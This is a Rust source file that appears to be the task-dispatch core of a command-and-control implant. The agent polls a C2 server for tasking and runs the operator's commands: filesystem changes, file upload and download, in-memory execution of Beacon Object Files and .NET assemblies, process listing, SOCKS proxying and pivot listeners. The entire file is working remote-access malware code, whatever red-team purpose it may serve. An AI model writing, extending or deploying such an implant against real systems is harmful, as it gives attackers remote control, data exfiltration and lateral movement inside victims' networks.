use crate::transport;
use crate::features::exit;
use crate::features::pong;
use crate::features::filesystem;
use crate::features::upload;
use crate::features::download;
use crate::features::psw;
use crate::features::socks;
use crate::features::executeBOF;
use crate::features::executeDOT;
use crate::features::list_processes;
use crate::features::pivot;

pub fn getTasking() -> Result<(), Box<dyn std::error::Error>> {
    let checkin_data = serde_json::json!({
        "action": "get_tasking",
        "tasking_size": 10 
    });
    let json_str = serde_json::to_string(&checkin_data)?;
    let json = transport::send_request_with_response(&json_str)?;

    let tasks = json.get("tasks").ok_or("No tasks field")?;
    for task in tasks.as_array().ok_or("Tasks not array")? {
        handleTask(task)?;
    }
    let socks = json.get("socks").ok_or("No socks field")?;
    for sock in socks.as_array().ok_or("Socks not array")? {
        socks::handle_socks(sock)?;
        // json server_id contains id , data is raw data, exit bool if exit, port is port? useless?
    }
    Ok(())
}

pub fn handleTask(task: &serde_json::Value) -> Result<(), Box<dyn std::error::Error>> {
    let command = task.get("command").unwrap().as_str().unwrap();
    let parameters = task.get("parameters").unwrap().as_str().unwrap();
    let timestamp = task.get("timestamp").unwrap().as_f64().unwrap();
    let id = task.get("id").unwrap().as_str().unwrap();

    let response_value = match command {
        "ping" => {
            pong::pong(task)?;
            return Ok(());
        }
        "exit" => {
            exit::exit(task)?;
            return Ok(());
        }
        "ls" | "rm" | "mkdir" | "mv" | "cp" | "touch" | "pwd" => {
            filesystem::handle_fs_command(task)?;
            return Ok(());
        }
        "upload" => {
            upload::upload(task)?;
            return Ok(());
        }
        "download" => {
            download::download(task)?;
            return Ok(());
        }
        "psw" => {
            psw::handle_ps_command(task)?;
            return Ok(());
        }
        "executeBOF" => {
            executeBOF::executeBOF(task)?;
            return Ok(());
        }
        "executeDOT" => {
            executeDOT::executeDOT(task)?;
            return Ok(());
        }
        "ps" => {
            list_processes::list_processes(task)?;
            return Ok(());
        }
        "start_pivot" => {
            pivot::startPivotListener(task)?;
            return Ok(());
        }
        "stop_pivot" => {
            pivot::stopPivotListener(task)?;
            return Ok(());
        }
        "list_pivot" => {
            pivot::listPivotListeners(task)?;
            return Ok(());
        }
        _ => {
            println!("Unknown command: {}", command);
        }
    };

    let response = serde_json::json!({
        "action": "post_response",
        "responses": [
            {
                "task_id": id,
                "user_output": response_value,
                "timestamp":  timestamp,
                "status": "success",
            }
        ]
    });

    let json_str = serde_json::to_string(&response)?;
    transport::send_request(&json_str)?;

    Ok(())
}
